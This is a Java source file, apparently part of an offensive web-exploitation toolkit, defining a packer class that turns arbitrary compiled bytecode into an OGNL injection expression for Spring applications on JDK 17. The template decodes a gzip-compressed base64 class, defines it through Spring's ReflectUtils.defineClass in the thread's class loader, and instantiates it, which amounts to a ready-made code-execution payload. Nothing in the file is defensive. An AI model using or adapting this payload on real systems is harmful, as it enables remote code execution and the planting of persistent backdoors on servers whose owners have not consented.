package com.reajason.javaweb.packer.ognl;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.Packers;
import lombok.SneakyThrows;

import static com.reajason.javaweb.packer.spel.SpELSpringGzipJDK17Packer.assertClassNameValid;

/**
 * @author ReaJason
 * @since 2025/7/7
 */
public class OGNLSpringGzipJDK17Packer implements Packer {
    String template = "(@org.springframework.cglib.core.ReflectUtils@defineClass('{{className}}',@org.springframework.util.StreamUtils@copyToByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(@org.springframework.util.Base64Utils@decodeFromString('{{base64Str}}')))),@java.lang.Thread@currentThread().getContextClassLoader(),null,@java.lang.Class@forName('org.springframework.expression.ExpressionParser'))).newInstance()";

    @Override
    @SneakyThrows
    public String pack(ClassPackerConfig config) {
        String className = config.getClassName();
        assertClassNameValid(className);
        return template.replace("{{className}}", className)
                .replace("{{base64Str}}", Packers.GzipBase64.getInstance().pack(config));
    }
}
